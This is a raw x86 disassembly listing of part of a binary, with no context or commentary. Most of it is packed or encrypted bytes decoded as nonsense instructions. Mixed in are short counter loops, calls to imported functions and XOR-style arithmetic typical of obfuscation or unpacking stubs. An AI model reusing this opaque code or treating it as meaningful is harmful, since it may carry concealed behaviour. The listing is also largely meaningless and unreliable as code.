  408429:	cmp    ebp,DWORD PTR [ebp-0x594b03de]
  40842f:	data16 fmul DWORD PTR [edi]
  408432:	jg     0x408445
  408434:	jo     0x4083b6
  408436:	scas   al,BYTE PTR es:[edi]
  408437:	push   ecx
  408438:	adc    ah,ch
  40843a:	ret    
  40843b:	push   edx
  40843c:	enter  0xe9ec,0x1
  408440:	pop    esi
  408441:	fld    DWORD PTR [eax-0x11033a89]
  408447:	fwait
  408448:	mov    eax,0x34bc68f6
  40844d:	cmc    
  40844e:	adc    ch,BYTE PTR [edx+0x25]
  408451:	jge    0x4084a1
  408453:	les    esi,FWORD PTR [ecx-0x2e69efca]
  408459:	lahf   
  40845a:	(bad)  
  40845b:	das    
  40845c:	repnz loope 0x4083fb
  40845f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408460:	ja     0x408479
  408462:	(bad)
  408465:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408466:	adc    BYTE PTR [eax+edx*2-0xc],dl
  40846a:	and    bl,al
  40846c:	or     eax,0x8def3116
  408471:	fldenv [eax-0x4ce27372]
  408477:	std    
  408478:	popf   
  408479:	(bad)  
  40847a:	push   ebp
  40847b:	out    dx,al
  40847c:	(bad)  
  40847d:	es pop ebp
  40847f:	mov    ch,0x2d
  408481:	pop    esi
  408482:	in     eax,0x4d
  408484:	jb     0x40849e
  408486:	mov    BYTE PTR [edx-0x18],dh
  408489:	leave  
  40848a:	mov    al,0x15
  40848c:	sub    WORD PTR [edi+0x31],0x2e
  408491:	data16 int3 
  408493:	ds cmp al,0x2a
  408496:	rcl    BYTE PTR [ebx-0x7f],0x39
  40849a:	dec    ebp
  40849b:	call   FWORD PTR ds:0x4ccbdfc6
  4084a1:	outs   dx,BYTE PTR ds:[esi]
  4084a2:	jo     0x4084c7
  4084a4:	mov    ah,0xc
  4084a6:	xchg   esp,ebx
  4084a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4084a9:	push   edx
  4084aa:	test   DWORD PTR [ebx],esi
  4084ac:	sub    eax,0x409ac193
  4084b1:	xor    al,0xaf
  4084b3:	loopne 0x4084b7
  4084b5:	or     BYTE PTR ds:0x61bd7d39,dh
  4084bb:	(bad)  
  4084bc:	adc    ecx,DWORD PTR [ecx]
  4084be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4084bf:	icebp  
  4084c0:	stc    
  4084c1:	inc    eax
  4084c2:	and    ebp,DWORD PTR [edx+ebx*8+0xa]
  4084c6:	retf   
  4084c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4084c8:	push   edx
  4084c9:	dec    ecx
  4084ca:	push   edi
  4084cb:	bound  esp,QWORD PTR [edi]
  4084cd:	sbb    al,0xfc
  4084cf:	sub    ah,bl
  4084d1:	lds    edx,FWORD PTR [ecx+edx*8-0x56]
  4084d5:	dec    esi
  4084d6:	sar    DWORD PTR [eax+0x2972f89f],1
  4084dc:	je     0x408465
  4084de:	sub    ah,bl
  4084e0:	fsubr  st,st(2)
  4084e2:	aas    
  4084e3:	push   eax
  4084e4:	int3   
  4084e5:	pop    esp
  4084e6:	mov    ah,BYTE PTR [esi+0x7082443]
  4084ec:	add    BYTE PTR [ecx-0x6dddba92],al
  4084f2:	or     BYTE PTR [edi],0x84
  4084f5:	dec    esi
  4084f6:	or     DWORD PTR [eax],eax
  4084f8:	add    bh,dh
  4084fa:	fcmovb st,st(7)
  4084fc:	inc    ebp
  4084fd:	hlt    
  4084fe:	(bad)  
  4084ff:	std    
  408500:	add    eax,0xf4458d07
  408505:	and    DWORD PTR ds:0x43382f,0x0
  40850f:	jmp    0x408521
  408514:	mov    edx,DWORD PTR ds:0x43382f
  40851a:	inc    edx
  40851b:	mov    DWORD PTR ds:0x43382f,edx
  408521:	cmp    DWORD PTR ds:0x43382f,0x13
  408528:	jae    0x40854b
  40852e:	cmp    DWORD PTR ds:0x43382f,0x17
  408535:	jne    0x408546
  40853b:	push   0x433867
  408540:	call   DWORD PTR ds:0x4121cc
  408546:	jmp    0x408514
  40854b:	mov    DWORD PTR [ebp-0x10],eax
  40854e:	and    eax,0x759a
  408553:	mov    eax,DWORD PTR [ebp-0x10]
  408556:	inc    edx
  408557:	mov    edx,DWORD PTR [eax]
  408559:	imul   edx,edx,0xf89ea9ee
  40855f:	mov    DWORD PTR [eax],edx
  408561:	mov    eax,DWORD PTR [ebp-0xc]
  408564:	mov    DWORD PTR ds:0x433717,0x1de7
  40856e:	cmp    eax,0x823721f2
  408573:	je     0x4088e8
  408579:	sub    edi,ebx
  40857b:	mov    eax,DWORD PTR [ebp-0x1c]
  40857e:	sbb    edi,DWORD PTR ds:0x433773
  408584:	or     DWORD PTR [eax],0x60751c9e
  40858a:	and    DWORD PTR ds:0x4337bf,0x0
  408594:	mov    ebx,DWORD PTR ds:0x4337bf
  40859a:	inc    ebx
  40859b:	mov    DWORD PTR ds:0x4337bf,ebx
  4085a1:	cmp    DWORD PTR ds:0x4337bf,0x1f
  4085a8:	jne    0x4085bf
  4085ae:	push   DWORD PTR [ebp-0x1c]
  4085b1:	push   0x4378
  4085b6:	push   DWORD PTR [ebp-0xc]
  4085b9:	call   DWORD PTR ds:0x412010
  4085bf:	cmp    DWORD PTR ds:0x4337bf,0x19
  4085c6:	jb     0x408594
  4085cc:	jmp    0x408753
  4085d1:	xor    BYTE PTR [esi+0x61516153],dh
  4085d7:	xor    BYTE PTR [edi+0x20],dh
  4085da:	outs   dx,BYTE PTR ds:[esi]
  4085db:	fucomi st,st(1)
  4085dd:	xor    BYTE PTR [ebx],bl
  4085df:	jnp    0x40858f
  4085e1:	in     al,dx
  4085e2:	sar    BYTE PTR [esi+0x7e],cl
  4085e5:	in     al,0x7f
  4085e7:	jle    0x408667
  4085e9:	cmp    esp,ebp
  4085eb:	sbb    al,0x35
  4085ed:	push   ecx
  4085ee:	lods   al,BYTE PTR ds:[esi]
  4085ef:	jmp    0x273b6bdd
  4085f4:	xchg   edx,eax
  4085f5:	int    0x4b
  4085f7:	in     al,dx
  4085f8:	adc    dl,ch
  4085fa:	ds pop ds
  4085fc:	or     BYTE PTR [eax],al
  4085fe:	pusha  
  4085ff:	push   esp
  408600:	and    al,BYTE PTR [ecx-0x7087f611]
  408606:	loope  0x408602
  408608:	fs data16 aas 
  40860b:	outs   dx,DWORD PTR ds:[esi]
  40860c:	dec    esp
  40860d:	xor    BYTE PTR [edx+0x501cf3d2],ah
  408613:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408614:	cmp    DWORD PTR [eax],ebp
  408616:	sbb    edx,DWORD PTR [ebp+0x4aad8289]
  40861c:	fcom   QWORD PTR [edi-0x5900ba00]
  408622:	lea    edi,[ebp+ebx*1+0xe061fd0]
  408629:	xchg   BYTE PTR [esi+0xf4f68a],cl
  40862f:	cmp    ebx,0xcdb83bf8
  408635:	dec    edi
  408636:	xor    edi,edi
  408638:	mov    esp,0x8e6f0757
  40863d:	pop    edi
  40863e:	push   ecx
  40863f:	(bad)  
  408640:	daa    
  408641:	es xchg edx,eax
  408643:	sub    edx,DWORD PTR [edi]
  408645:	int    0xf4
  408647:	xchg   ebp,eax
  408648:	ss bnd ret 
  40864b:	mov    WORD PTR [edi-0x77],es
  40864e:	clc    
  40864f:	out    dx,eax
  408650:	mov    BYTE PTR [ebx-0x5f],bh
  408653:	jb     0x40864a
  408655:	jns    0x408611
  408657:	out    0x5a,eax
  408659:	sti    
  40865a:	mov    bh,0x9a
  40865c:	push   esp
  40865d:	or     BYTE PTR [edx],ah
  40865f:	adc    ah,ah
  408661:	mov    esi,0xeee0cf81
  408666:	dec    ebx
  408667:	mov    DWORD PTR [edx-0x72a9c9b],0xa496c99
  408671:	in     al,0xd0
  408673:	inc    edx
  408674:	mov    esi,0xbd52785c
  408679:	jno    0x40861e
  40867b:	(bad)
  40867f:	cmp    al,BYTE PTR [eax]
  408681:	mov    al,cs:0x884e7404
  408687:	or     esp,DWORD PTR [edi+esi*4+0x6d5a1102]
  40868e:	dec    edi
  40868f:	leave  
  408690:	mov    ch,0x71
  408692:	or     eax,0xda1f8f14
  408697:	mov    bh,0x61
  408699:	push   edx
  40869a:	push   cs
  40869b:	mov    WORD PTR [esi-0x67],ds
  40869e:	or     DWORD PTR [edi],0xffffffe9
  4086a1:	mov    WORD PTR [edi-0x4a3239fb],fs
  4086a7:	push   ebx
  4086a8:	fadd   st(0),st
  4086aa:	jp     0x408667
  4086ac:	dec    edx
  4086ad:	les    edi,FWORD PTR [edx]
  4086af:	jg     0x4086c1
  4086b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086b2:	and    BYTE PTR [eax-0x6236d44b],0xb4
  4086b9:	push   eax
  4086ba:	ja     0x4086ce
  4086bc:	xor    al,0x4a
  4086be:	les    edi,FWORD PTR [edx-0xfd22c3a]
  4086c4:	mov    ecx,0x33a0c83e
  4086c9:	push   0xf07fa1e6
  4086ce:	mov    WORD PTR [esi+0x54a34164],gs
  4086d4:	popa   
  4086d5:	jno    0x40873b
  4086d7:	pusha  
  4086d8:	mov    edi,0xec48d4fc
  4086dd:	xor    edi,ebp
  4086df:	mov    ebp,DWORD PTR [edi-0x5455542a]
  4086e5:	ffreep st(6)
  4086e7:	push   ds
  4086e8:	xchg   bl,bl
  4086ea:	call   0xc5c:0xf597fee9
  4086f1:	xor    eax,DWORD PTR [edi+0x24d34746]
  4086f7:	jg     0x408752
  4086f9:	xlat   BYTE PTR ds:[ebx]
  4086fa:	lds    ebx,FWORD PTR [edx]
  4086fc:	outs   dx,BYTE PTR ds:[esi]
  4086fd:	je     0x4086dc
  4086ff:	or     ah,BYTE PTR [ecx]
  408701:	mov    WORD PTR [edx+eiz*2+0x6b3b5509],gs
  408708:	clc    
  408709:	adc    dl,BYTE PTR [ebx+ebp*4]
  40870c:	in     al,dx
  40870d:	std    
  40870e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40870f:	sbb    ebx,DWORD PTR [ebx]
  408711:	or     DWORD PTR [esp+esi*8-0x76608d94],ebx
  408718:	push   edi
  408719:	xor    DWORD PTR [esi],0x23ae9f90
  40871f:	or     DWORD PTR [edi+0x1a83aa9f],ebp
  408725:	loope  0x4086bd
  408727:	lahf   
  408728:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408729:	jge    0x40874b
  40872b:	mov    edx,0xfe1b216
  408730:	and    BYTE PTR [edx+ecx*2],bh
  408733:	jae    0x4086c3
  408735:	call   0xa511:0x7a1dca78
  40873c:	dec    ebx
  40873d:	cs cmp eax,0x97451967
  408743:	inc    ebx
  408744:	jb     0x40870d
  408746:	dec    edi
  408747:	or     BYTE PTR [edi],bl
  408749:	aad    0x4b
  40874b:	rol    BYTE PTR [eax+0x69ea128],0x5a
  408752:	sahf   
  408753:	mov    eax,DWORD PTR [ebp-0x8]
  408756:	xor    eax,ecx
  408758:	add    eax,esi
  40875a:	jmp    0x4088e1
  40875f:	(bad)  
  408761:	adc    DWORD PTR [ebp+0x71684531],eax
  408767:	test   BYTE PTR [esi+0x41],cl
  40876a:	or     dl,dl
  40876c:	sahf   
  40876d:	mov    edi,0x7ed35237
  408772:	jle    0x408758
  408774:	jg     0x4087f4
  408776:	jle    0x408757
  408778:	cld    
  408779:	shr    ecx,0x7
  40877c:	or     ebx,DWORD PTR [ebx+0x16]
  40877f:	cli    
  408780:	test   eax,0x115cddc8
  408785:	mov    DWORD PTR [ebp-0x61ac5edd],0xd0c0d2aa
  40878f:	lods   al,BYTE PTR ds:[esi]
  408790:	popf   
  408791:	sbb    BYTE PTR [edx-0x72324a57],dl
  408797:	ins    DWORD PTR es:[edi],dx
  408798:	(bad)  
  408799:	mul    BYTE PTR [edx]
  40879b:	sbb    esi,ecx
  40879d:	xor    al,0xa7
  40879f:	pushw  ss
  4087a1:	jmp    0xd8367006
  4087a6:	sbb    BYTE PTR [ebx-0x3],ah
  4087a9:	xchg   ebp,eax
  4087aa:	jge    0x408829
  4087ac:	dec    ebx
  4087ad:	call   0x6a9c44a8
  4087b2:	mov    BYTE PTR [ebx],ch
  4087b4:	jp     0x40880e
  4087b6:	js     0x408812
  4087b8:	adc    DWORD PTR [ebp-0x7548a0d4],edx
  4087be:	dec    ecx
  4087bf:	jg     0x40874d
  4087c1:	push   ecx
  4087c2:	xchg   esp,eax
  4087c3:	or     BYTE PTR [edx-0x5051b40d],dl
  4087c9:	push   ecx
  4087ca:	adc    DWORD PTR [eax-0x578e528f],esi
  4087d0:	mov    al,ds:0xb04a128b
  4087d5:	nop
  4087d6:	mov    al,BYTE PTR [edx+edi*2+0x7e]
  4087da:	ins    DWORD PTR es:[edi],dx
  4087db:	pop    edi
  4087dc:	fs stos BYTE PTR es:[edi],al
  4087de:	sub    eax,0x40cce580
  4087e3:	pushf  
  4087e4:	adc    al,0x4
  4087e6:	push   eax
  4087e7:	cmp    cl,BYTE PTR [ecx+edi*1-0x4b]
  4087eb:	xchg   esp,eax
  4087ec:	xchg   edi,eax
  4087ed:	loopne 0x4087fb
  4087ef:	xchg   ecx,eax
  4087f0:	mov    edi,0x186ba6e4
  4087f5:	sub    dl,BYTE PTR [edi+0x161921a0]
  4087fb:	inc    ebp
  4087fc:	stos   BYTE PTR es:[edi],al
  4087fd:	das    
  4087fe:	jmp    0x3b0210fb
  408803:	dec    esp
  408804:	mov    ds:0x39679e2e,al
  408809:	jne    0x4087dc
  40880b:	repz or DWORD PTR [edx+0x1e4faec1],esp
  408812:	and    esp,DWORD PTR [ecx-0x21950485]
  408818:	jnp    0x408874
  40881a:	and    ebp,0xf7e31b95
  408820:	loopne 0x40885a
  408822:	mov    ds:0x5e0a166a,al
  408827:	dec    edi
  408828:	mov    dl,0xcd
  40882a:	lds    ebp,FWORD PTR [ecx]
  40882c:	bound  eax,QWORD PTR [edi]
  40882e:	mov    ah,0xfc
  408830:	push   ds
  408831:	or     BYTE PTR [edx-0x1f],dl
  408834:	loope  0x408871
  408836:	ret    
  408837:	inc    edx
  408838:	ror    DWORD PTR [edi],1
  40883a:	jecxz  0x40885d
  40883c:	dec    edi
  40883d:	xor    BYTE PTR ds:0xdf46762b,0x35
  408844:	add    al,0xf8
  408846:	sub    BYTE PTR ds:0x886105a7,bh
  40884c:	shl    BYTE PTR [esi-0x7f],1
  40884f:	mov    ch,0x4b
  408851:	or     eax,0x7826cb15
  408856:	mov    cl,0x34
  408858:	xchg   esi,eax
  408859:	pop    edx
  40885a:	loop   0x408858
  40885c:	std    
  40885d:	xchg   ebx,eax
  40885e:	cwde   
  40885f:	mov    fs,esi
  408861:	mov    dl,0x25
  408863:	(bad)  
  408864:	ja     0x4088aa
  408866:	and    DWORD PTR [ebx+0x1f],ecx
  408869:	cdq    
  40886a:	adc    ecx,DWORD PTR [edi]
  40886c:	imul   esp,DWORD PTR [edx+0x40],0xffffffff
  408870:	mov    ecx,0x7ac56ab9
  408875:	pop    eax
  408876:	xchg   ecx,eax
  408877:	jmp    0x6a29:0x164c0811
  40887e:	std    
  40887f:	jns    0x4088ba
  408881:	mov    cs,WORD PTR [ecx+0x8d9509f]
  408887:	(bad)  
  408888:	js     0x4088ab
  40888a:	imul   ecx,DWORD PTR [ebx],0x4749ec93
  408890:	push   eax
  408891:	punpcklwd mm7,mm2
  408894:	sahf   
  408895:	or     DWORD PTR [edx],edi
  408897:	retf   0x42b4
  40889a:	xor    eax,0x773007d6
  40889f:	ds dec edx
  4088a1:	inc    esi
  4088a2:	xchg   esi,eax
  4088a3:	pop    edi
  4088a4:	test   bh,0xb7
  4088a7:	xor    esp,DWORD PTR [eax+0x425982b5]
  4088ad:	outs   dx,DWORD PTR ds:[esi]
  4088ae:	shl    edi,1
  4088b0:	mov    BYTE PTR [ebp+0x3a],al
  4088b3:	shl    edx,cl
  4088b5:	jl     0x40886b
  4088b7:	das    
  4088b8:	mov    ebx,0x713505a8
  4088bd:	xor    edi,DWORD PTR [edx]
  4088bf:	clc    
  4088c0:	cdq    
  4088c1:	ficomp DWORD PTR [esi+0x5c]
  4088c4:	mov    cl,BYTE PTR [edi+0x33]
  4088c7:	(bad)  
  4088c9:	(bad)  
  4088ca:	rcr    ebp,cl
  4088cc:	adc    DWORD PTR [eax],ebx
  4088ce:	scas   eax,DWORD PTR es:[edi]
  4088cf:	jg     0x40890e
  4088d1:	out    0x2d,al
  4088d3:	xchg   ebp,esi
  4088d5:	inc    ebp
  4088d6:	mov    al,ds:0xf360c467
  4088db:	(bad)  
  4088dc:	out    dx,al
  4088dd:	add    ah,BYTE PTR [ebx+0x5e5fba49]
  4088e3:	pop    ebx
  4088e4:	leave  
  4088e5:	ret    0x4
  4088e8:	mov    eax,DWORD PTR [ebp-0xc]
  4088eb:	add    eax,DWORD PTR [ebp-0x18]
  4088ee:	cmp    eax,0x7ad64f9b
  4088f3:	je     0x408907
  4088f9:	mov    eax,DWORD PTR [ebp-0x10]
  4088fc:	and    DWORD PTR [eax],0x751c99
  408902:	jmp    0x40858a
  408907:	mov    eax,DWORD PTR [ebp-0xc]
  40890a:	mov    edx,DWORD PTR [ebp-0x18]
  40890d:	or     eax,edx
  40890f:	cmp    eax,0xfabf2dfb
  408914:	je     0x408928
  40891a:	mov    eax,DWORD PTR [ebp-0x10]
  40891d:	xor    DWORD PTR [eax],0x2650fa8f
  408923:	jmp    0x40858a
  408928:	mov    ax,WORD PTR [ebp-0x4]
  40892c:	jmp    0x408ab3
  408931:	test   eax,0x53c2d3f0
  408936:	loope  0x4088e1
  408938:	jno    0x40892b
  40893a:	jmp    0xce8e681a
  40893f:	sub    al,BYTE PTR [esi]
  408941:	cmp    cl,dl
  408943:	jle    0x4089c3
  408945:	in     al,0x7f
  408947:	jle    0x4089c7
  408949:	lods   al,BYTE PTR ds:[esi]
  40894a:	das    
  40894b:	push   0x47450ff6
  408950:	jns    0x408925
  408952:	ds pushf 
  408954:	adc    edx,DWORD PTR [ebx-0x2ad62f11]
  40895a:	inc    edx
  40895b:	std    
  40895c:	add    bh,dh
  40895e:	sbb    al,0xd8
  408960:	pop    ecx
  408961:	int    0xda
  408963:	mov    ds:0xfd061769,al
  408968:	or     BYTE PTR gs:[edi-0x1b],ch
  40896c:	mov    dh,0xe1
  40896e:	inc    edi
  40896f:	inc    edx
  408970:	add    eax,0x7527b8c6
  408975:	xchg   ebp,eax
  408976:	mov    cs,WORD PTR [esi+0x1c]
  408979:	repz in al,dx
  40897b:	xchg   BYTE PTR [ebp+0x56],ch
  40897e:	cld    
  40897f:	or     ch,BYTE PTR [ebp-0x3b]
  408982:	mov    al,0x87
  408984:	xor    bh,BYTE PTR [ecx+edx*8]
  408987:	icebp  
  408988:	lock arpl bx,ax
  40898b:	or     BYTE PTR [esi+0x1cea552d],bl
  408991:	xor    eax,DWORD PTR [edi+0x5027d803]
  408997:	sub    eax,0xa4d69efe
  40899c:	push   ebp
  40899d:	scas   al,BYTE PTR es:[edi]
  40899e:	mov    cl,0x93
  4089a0:	fcomp  QWORD PTR [eax-0x5d]
  4089a3:	adc    BYTE PTR [eax+0x4e],cl
  4089a6:	mov    dh,0xa3
  4089a8:	rcl    DWORD PTR cs:[edx+0x45],1
  4089ac:	ret    
  4089ad:	shr    edx,1
  4089af:	fs sbb bl,bl
  4089b2:	push   0x2c
  4089b4:	pop    edi
  4089b5:	mov    ds:0x95df659a,eax
  4089ba:	pop    esp
  4089bb:	sub    cl,BYTE PTR [ebx-0xed66d3d]
  4089c1:	popa   
  4089c2:	outs   dx,BYTE PTR ds:[esi]
  4089c3:	mov    al,0x48
  4089c5:	xor    cl,BYTE PTR [esi-0x5]
  4089c8:	js     0x408963
  4089ca:	sar    BYTE PTR [edx-0x5b],1
  4089cd:	ror    cl,cl
  4089cf:	jb     0x408a0d
  4089d1:	and    DWORD PTR [ebx],ebx
  4089d3:	out    0x2,al
  4089d5:	push   edi
  4089d6:	lods   eax,DWORD PTR ds:[esi]
  4089d7:	and    al,0xa7
  4089d9:	scas   eax,DWORD PTR es:[edi]
  4089da:	loope  0x408980
  4089dc:	xor    BYTE PTR [ebx-0x28],0x14
  4089e0:	mov    al,ds:0xcb7ee528
  4089e5:	retfw  0x44c4
  4089e9:	dec    edx
  4089ea:	jecxz  0x4089c1
  4089ec:	aad    0xae
  4089ee:	or     ax,0x4b40
  4089f2:	enter  0x9c70,0xb7
  4089f6:	mov    ecx,es
  4089f8:	outs   dx,BYTE PTR ds:[esi]
  4089f9:	jmp    0x1525:0xaec95521
  408a00:	sar    BYTE PTR [eax],cl
  408a02:	jnp    0x4089bb
  408a04:	fcom   QWORD PTR [ecx]
  408a06:	gs js  0x408a4b
  408a09:	dec    eax
  408a0a:	lds    edx,FWORD PTR [edi+0x43]
  408a0d:	out    dx,al
  408a0e:	mov    bh,0xbe
  408a10:	ins    BYTE PTR es:[edi],dx
  408a11:	cwde   
  408a12:	lds    esp,FWORD PTR [edx-0x44]
  408a15:	mov    BYTE PTR [edi-0x48],bl
  408a18:	hlt    
  408a19:	aad    0x79
  408a1b:	push   edx
  408a1c:	sbb    BYTE PTR [esi],dl
  408a1e:	jno    0x408a83
  408a20:	mov    edi,0xfc73469a
  408a25:	push   ss
  408a26:	gs inc edi
  408a28:	(bad)  
  408a29:	pop    esp
  408a2a:	push   edx
  408a2b:	retf   
  408a2c:	jae    0x408a9f
  408a2e:	int3   
  408a2f:	mov    esp,0x438336cb
  408a34:	(bad)  
  408a35:	out    dx,eax
  408a36:	cmp    cl,BYTE PTR [eax]
  408a38:	enter  0x1ea4,0x1e
  408a3c:	mov    edi,0xb7fa9232
  408a41:	cmc    
  408a42:	into   
  408a43:	xor    edi,DWORD PTR [ecx-0x29]
  408a46:	and    al,BYTE PTR [edi+edi*4-0xe]
  408a4a:	add    DWORD PTR [edx],esp
  408a4c:	adc    eax,0xfe4ac3cb
  408a51:	aam    0xc6
  408a53:	push   ss
  408a54:	nop
  408a55:	stc    
  408a56:	retf   
  408a57:	mov    al,ds:0x9075eb01
  408a5c:	jge    0x408a86
  408a5e:	or     DWORD PTR [eax+ebp*1],edi
  408a61:	mov    ch,0x8d
  408a63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a64:	popf   
  408a65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a66:	enter  0x6659,0xad
  408a6a:	ja     0x408a7d
  408a6c:	in     al,dx
  408a6d:	cdq    
  408a6e:	das    
  408a6f:	shl    DWORD PTR [edi],0xc3
  408a72:	int3   
  408a73:	pushf  
  408a74:	aas    
  408a75:	out    0xa1,al
  408a77:	repnz pop edi
  408a79:	sbb    ebp,DWORD PTR [edi]
  408a7b:	inc    ecx
  408a7c:	sbb    DWORD PTR [ebx],ebx
  408a7e:	retf   0xa6e2
  408a81:	pop    eax
  408a82:	sbb    cl,BYTE PTR [ecx-0xa]
  408a85:	out    0xdc,eax
  408a87:	in     al,0x8f
  408a89:	ja     0x408a62
  408a8b:	lock sub cl,ch
  408a8e:	loop   0x408a88
  408a90:	clc    
  408a91:	ficomp DWORD PTR [eax-0x7bae6c44]
  408a97:	xor    cl,dl
  408a99:	mov    bl,0xa1
  408a9b:	mov    ds:0x530affb,eax
  408aa0:	jns    0x408a54
  408aa2:	stos   DWORD PTR es:[edi],eax
  408aa3:	xchg   ebp,eax
  408aa4:	lea    ecx,[ebp+0x3e84faf4]
  408aaa:	icebp  
  408aab:	or     ebp,ecx
  408aad:	retf   0x6bfb
  408ab0:	in     al,0x55
  408ab2:	dec    edx
  408ab3:	mov    edi,DWORD PTR [ebp+0x8]
  408ab6:	mov    edi,DWORD PTR [edi]
  408ab8:	mov    edx,0x8a3c
  408abd:	xor    ax,dx
  408ac0:	mov    edx,0x3b02
  408ac5:	add    ax,dx
  408ac8:	cmp    ax,WORD PTR [edi]
  408acb:	je     0x408c9f
  408ad1:	mov    eax,DWORD PTR [ebp-0x14]
  408ad4:	xor    eax,ecx
  408ad6:	add    eax,esi
  408ad8:	mov    DWORD PTR [ebp-0x24],eax
  408adb:	mov    eax,DWORD PTR [ebp-0x28]
  408ade:	mov    di,WORD PTR [ebp-0x2c]
  408ae2:	mov    ebx,0x8a3c
  408ae7:	xor    di,bx
  408aea:	add    di,dx
  408aed:	movzx  edx,di
  408af0:	mov    edi,DWORD PTR [ebp-0x8]
  408af3:	xor    edi,ecx
  408af5:	lea    edx,[edx+edi*1+0x32729b]
  408afc:	add    DWORD PTR [eax],edx
  408afe:	mov    eax,DWORD PTR [ebp-0x20]
  408b01:	mov    edx,DWORD PTR [ebp-0x8]
  408b04:	mov    edi,DWORD PTR [ebp-0x24]
  408b07:	xor    edx,ecx
  408b09:	jmp    0x408c90
  408b0e:	push   esi
  408b0f:	adc    BYTE PTR [ebx+0x50555155],0x81
  408b16:	sub    esi,edi
  408b18:	jmp    0x408b0d
  408b1a:	pop    esi
  408b1b:	push   0xffffffc9
  408b1d:	mov    edi,0x7e7edeae
  408b22:	in     al,0x7f
  408b24:	jle    0x408ba4
  408b26:	clc    
  408b27:	out    0xca,eax
  408b29:	mov    al,ds:0x602d6d1b
  408b2e:	pop    ss
  408b2f:	ret    0x4b1a
  408b32:	sbb    dh,BYTE PTR [ebx-0x17]
  408b35:	jmp    0x4167:0x2ec1d1f5
  408b3c:	push   0xafdc6edb
  408b41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b42:	inc    ebp
  408b43:	push   esi
  408b44:	ret    0xfad1
  408b47:	fcmovb st,st(3)
  408b49:	push   ds
  408b4a:	mov    ch,0xc7
  408b4c:	ja     0x408b57
  408b4e:	ja     0x408b5e
  408b50:	(bad)  
  408b51:	jle    0x408b6f
  408b53:	mov    ds:0xe92df50,eax
  408b58:	add    eax,0xffffffdf
  408b5b:	add    al,0x7c
  408b5d:	xchg   edx,eax
  408b5e:	call   0xcfd2dd8f
  408b63:	ins    DWORD PTR es:[edi],dx
  408b64:	or     dh,cl
  408b66:	mov    edi,0xb2774eb4
  408b6b:	das    
  408b6c:	inc    edx
  408b6d:	outs   dx,DWORD PTR ds:[esi]
  408b6e:	aad    0x69
  408b70:	jge    0x408b58
  408b72:	xor    ecx,edx
  408b74:	loop   0x408be9
  408b76:	inc    ebp
  408b77:	stos   DWORD PTR es:[edi],eax
  408b78:	repnz sahf 
  408b7a:	cmc    
  408b7b:	or     al,0x59
  408b7d:	jmp    0xd519:0xad88fb0b
  408b84:	clc    
  408b85:	pop    edi
  408b86:	mov    cl,0x48
  408b88:	dec    eax
  408b89:	ja     0x408bf8
  408b8b:	stc    
  408b8c:	sbb    edx,esp
  408b8e:	xor    ch,BYTE PTR [edx]
  408b90:	dec    ecx
  408b91:	in     al,0xe3
  408b93:	mov    al,0x76
  408b95:	mov    ah,0x65
  408b97:	(bad)  
  408b98:	outs   dx,BYTE PTR ds:[esi]
  408b99:	ret    
  408b9a:	mov    cl,0xf1
  408b9c:	push   ebp
  408b9d:	add    bl,bh
  408b9f:	mov    ds,esp
  408ba1:	jnp    0x408b5f
  408ba3:	jp     0x408bfd
  408ba5:	lock loopne 0x408b3c
  408ba8:	sbb    edx,eax
  408baa:	mov    dl,0x6d
  408bac:	out    0x4f,al
  408bae:	and    BYTE PTR [ebx+0x342c23bf],ah
  408bb4:	mov    eax,ds:0x3d207111
  408bb9:	hlt    
  408bba:	pop    es
  408bbb:	adc    BYTE PTR [ecx+0x4591f204],cl
  408bc1:	cdq    
  408bc2:	imul   DWORD PTR [edi]
  408bc4:	dec    ebp
  408bc5:	sbb    eax,0xd2f8f8ff
  408bca:	loope  0x408c2a
  408bcc:	test   al,0xc5
  408bce:	mov    ebp,0x3c89a39c
  408bd3:	jns    0x408b5e
  408bd5:	leave  
  408bd6:	aas    
  408bd7:	mov    edi,0x366c8559
  408bdc:	icebp  
  408bdd:	xchg   edx,eax
  408bde:	jae    0x408b99
  408be0:	xchg   edx,eax
  408be1:	mov    ebp,0x5cc2761a
  408be6:	retf   
  408be7:	aam    0xaf
  408be9:	push   esp
  408bea:	in     al,0x8
  408bec:	jle    0x408b6e
  408bee:	pop    ds
  408bef:	and    DWORD PTR [esi+0x28],edx
  408bf2:	sbb    edi,DWORD PTR ds:0x217a4e6c
  408bf8:	int3   
  408bf9:	das    
  408bfa:	js     0x408bfb
  408bfc:	dec    ebp
  408bfd:	cli    
  408bfe:	mov    eax,0x63de30df
  408c03:	jbe    0x408bbe
  408c05:	xchg   BYTE PTR [eax+0x5a574d93],bh
  408c0b:	xor    dh,BYTE PTR [eax-0x80]
  408c0e:	add    eax,0x32c7c2f1
  408c13:	xchg   DWORD PTR [ebp+0x23],ebx
  408c16:	mov    bh,0x51
  408c18:	ds jbe 0x408c1a
  408c1b:	add    ebx,DWORD PTR [ecx]
  408c1d:	pop    ds
  408c1e:	push   eax
  408c1f:	sbb    ebp,DWORD PTR [ebp-0x2be0cd6]
  408c25:	stos   DWORD PTR es:[edi],eax
  408c26:	je     0x408bb6
  408c28:	je     0x408c6a
  408c2a:	cmp    BYTE PTR [ebx-0x16],0xa4
  408c2e:	xor    al,0x56
  408c30:	icebp  
  408c31:	leave  
  408c32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c33:	cmp    DWORD PTR [edi],esp
  408c35:	mov    edi,0x635332e6
  408c3a:	mov    dh,BYTE PTR [esi-0x7d0e3191]
  408c40:	push   ds
  408c41:	mov    al,0xb6
  408c43:	aaa    
  408c44:	pop    es
  408c45:	cmp    eax,0x4f441f18
  408c4a:	mov    cl,0xe9
  408c4c:	ret    
  408c4d:	xchg   bl,cl
  408c4f:	shl    BYTE PTR [edx+0x1bb06cdd],0xea
  408c56:	not    DWORD PTR [ebx-0x67]
  408c59:	jmp    0x4833:0xac7b4478
